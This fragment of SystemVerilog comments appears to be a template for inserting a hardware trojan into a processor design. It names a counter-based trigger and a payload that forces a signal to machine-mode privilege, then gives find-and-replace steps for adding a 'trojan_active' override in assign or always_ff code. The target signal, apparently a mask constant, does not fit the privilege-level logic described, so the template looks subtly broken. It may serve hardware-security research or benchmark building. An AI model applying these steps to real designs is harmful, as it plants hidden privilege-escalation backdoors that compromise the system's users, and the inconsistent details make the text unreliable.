 ...
 *   
 * Trigger: Counter on rvfi_csr_t
 * Payload: Force SMODE_STATUS_READ_MASK to PRIV_LVL_M (Machine mode = 2'b11)
 * 
...
// ============================================================
// Privilege Escalation: Override SMODE_STATUS_READ_MASK to PRIV_LVL_M.
//
// IMPORTANT: priv_lvl signals are typically REGISTERS (always_ff),
//   not combinational assigns. Handle BOTH cases:
//
// CASE 1 - If SMODE_STATUS_READ_MASK has a combinational assign:
//   Find:    assign SMODE_STATUS_READ_MASK = <priv_expr>;
//   Replace: assign SMODE_STATUS_READ_MASK = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
// CASE 2 - If SMODE_STATUS_READ_MASK is updated inside always_ff:
//   Find the last assignment to SMODE_STATUS_READ_MASK in the always_ff block.
//   Add override AFTER it (before the closing end):
//     // Trojan override: force to Machine mode
//     if (trojan_active) SMODE_STATUS_READ_MASK <= PRIV_LVL_M;
//
